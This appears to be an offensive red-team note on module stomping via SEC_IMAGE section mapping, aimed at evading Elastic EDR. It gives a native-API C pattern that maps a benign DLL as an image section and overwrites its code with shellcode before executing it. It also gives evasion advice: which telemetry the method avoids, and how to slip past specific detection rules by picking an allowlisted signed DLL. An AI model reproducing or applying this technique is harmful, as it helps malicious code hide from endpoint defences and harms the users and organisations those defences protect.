# Module Stomping via Section Mapping (SEC_IMAGE)

## Goal
Stomp a DLL's executable code while it is mapped as an **image section** (`SEC_IMAGE`), avoiding `LoadLibrary` telemetry and keeping the module out of the PEB loader list — the strongest variant of Module Stomping against Elastic.

## Pattern (native API)
```c
// 1. Open the sacrificial DLL file (benign path, e.g. C:\Windows\System32\*.dll
//    or an allowlisted location like c:\program files\*)
NtCreateFile(&hFile, FILE_READ_DATA | FILE_EXECUTE | SYNCHRONIZE,
             &objAttr, &ioStatus, NULL, FILE_ATTRIBUTE_NORMAL,
             FILE_SHARE_READ, FILE_OPEN, FILE_NON_DIRECTORY_FILE | ...);

// 2. Create an image section — mapped copy-on-write, file-backed
NtCreateSection(&hSecImg, SECTION_ALL_ACCESS, NULL, NULL,
                PAGE_READONLY, SEC_IMAGE, hFile);

// 3. Map it into our own process
NtMapViewOfSection(hSecImg, GetCurrentProcess(), &base, 0,0,0,
                   &viewSize, ViewShare, 0, PAGE_READONLY);

// 4. Overwrite target region after flipping its protection
VirtualProtect(targetInImage, payloadSize, PAGE_READWRITE, &old);
memcpy(targetInImage, shellcode, payloadSize);
VirtualProtect(targetInImage, payloadSize, PAGE_EXECUTE_READ, &old);

// 5. Execute — via fiber (module_stomping_fiber), direct call, or callback
```

## Why it beats LoadLibrary-based stomping
- No `library_load` event → rules keying on image-load + write sequences miss it.
- `NtMapViewOfSection(SEC_IMAGE)` produces a file-backed mapping whose address resolves to the real DLL path in `call_stack_*` fields — `unbacked`/ `private memory` rules pass.
- Not in `InLoadOrderModuleList` → PEB-walk module scans don't see it (though VAD-based scans still do — the memory is a `MEM_IMAGE` region either way).

## Detection surface (Elastic)
- `NtCreateSection`/`NtMapViewOfSection` are API events — pick clean `process.Ext.api.parameters` (SEC_IMAGE + READONLY, no EXECUTE at map time).
- RW write + RX flip on an image region can trip `memory write to image section` style rules — mitigate by choosing a DLL already allowlisted in the rule's `call_stack_final_user_module` path filters.
- Hash allowlists (`call_stack_final_user_module.hash.sha256`) hash the *on-disk* file — a pristine signed DLL passes even though its memory is stomped.

## Pitfalls
- Image sections map at the DLL's preferred base layout; PE header parsing of the mapped view is required to find `.text`.
- Never call the DLL's exports/entry — the region is corrupted after stomping.
